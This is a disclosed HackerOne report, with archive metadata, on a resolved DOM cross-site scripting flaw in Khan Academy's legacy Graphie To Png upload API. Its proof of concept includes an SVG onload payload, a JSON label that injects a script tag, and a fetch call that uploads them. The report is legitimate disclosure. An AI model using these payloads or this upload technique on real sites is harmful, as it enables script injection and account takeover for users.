---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-dom
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - DOM"
enriched: true
body: true
date: 2025-02-06
submitted: 2024-11-18T08:39:51.846Z
bounty_usd: null
votes: 86
cve: []
program: "[[programs/khanacademy|Khan Academy]]"
reporter: "sikn"
source: "https://hackerone.com/reports/2846011"
title: "XSS on using the legacy 'Graphie To Png' API"
---
# XSS on using the legacy "Graphie To Png" API

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 86 | **Program:** Khan Academy | **Disclosed:** 2025-02-06

- Report: [https://hackerone.com/reports/2846011](https://hackerone.com/reports/2846011)
- CWE: Cross-site Scripting (XSS) - DOM
- Submitted: 2024-11-18T08:39:51.846Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

An attacker can can upload malicious graphies via (http://graphie-to-png.kasandbox.org/) and (http://graphie-to-png.khanacademy.systems/) that exploit the graphie renderer.
The attack targets any page that has a graphie (`khanacademy.org`!!), as well as `cdn.kastatic.org` and `ka-perseus-graphie.s3.amazonaws.com`

# Proof of concept
## Step 1: Uploading a malicious graphie
consider the following example where https://ka-perseus-graphie.s3.amazonaws.com/2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg is used in an article, we will override it by uploading the same JS but with malicious SVG and JSON data (because the hash is a hash of the JS).

1. **Malicious SVG:** The SVG is modified to include a malicious `onload` attribute.
```html
<svg ... onload="alert('SIKN')">...</svg>
```
2. **Malicious JSON:** A label is modified with `typesetAsMath: false`, causing the graphie renderer to inject our code to DOM. This is what will target `khanacademy.org`
```json
{
	"labels": [
		{
			"content": "<script>alert('SIKN')</script>",
			"typesetAsMath": false,
			...
		},
		...
	],
	...
}
```
```js
var form = new FormData();
form.append("js", ORIGINAL_JS);
form.append("svg", XSS_SVG);
form.append("other_data", JSON.stringify(XSS_JSON));

await fetch("http://graphie-to-png.kasandbox.org/svg", {
    "method": "POST",
    "body": form
}).then(r=>r.text())
```


## Step 2: Wait patiently
Wait until cdn.kastatic.org updates its cache, for this example I had already prepared it by not caching the original graphie (https://cdn.kastatic.org/ka-perseus-graphie/2122427aa8dc4ef2a59058bc1a7a934ba6ca6747.svg)

As for the malicious JSON, using the devtools override feature to simulate an attack shows that it works:
{F3766148}

## Impact

XSS on pages that use graphies, potentially leading to account takeovers.

## Timeline

- **Draft Started**
- **Report Filed**
- **Report Triaged**
- **2024-11-19** @sikn: Thank you, my username is SA8R
- **2024-11-19** @jeremyspangler: Thanks, the badge should be added to your account today!
- **2025-01-06** @sikn: any updates?
- **2025-01-06** @samhays_ka: Thank you again for your report. This should now be fixed – can you confirm?
- **2025-01-07** @sikn: Yes its fixed thank you!
- **Report Resolved**
- **Agreed On Going Public**
- **2025-01-08** @sikn: disclose please?
- **Report Became Public**
